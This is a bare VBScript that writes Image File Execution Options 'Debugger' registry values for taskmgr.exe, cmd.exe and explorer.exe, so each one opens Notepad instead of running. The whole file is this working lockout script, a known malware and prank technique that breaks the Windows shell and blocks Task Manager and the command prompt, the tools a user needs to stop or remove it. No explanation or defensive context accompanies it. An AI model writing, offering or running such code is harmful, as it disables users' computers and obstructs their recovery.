Set WshShell = CreateObject("WScript.Shell")

' Block Task Manager
key = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe\Debugger"
WshShell.RegWrite key, "notepad.exe", "REG_SZ"

' Block Command Prompt
key = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe\Debugger"
WshShell.RegWrite key, "notepad.exe", "REG_SZ"

' Block File Explorer
key = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe\Debugger"
WshShell.RegWrite key, "notepad.exe", "REG_SZ"
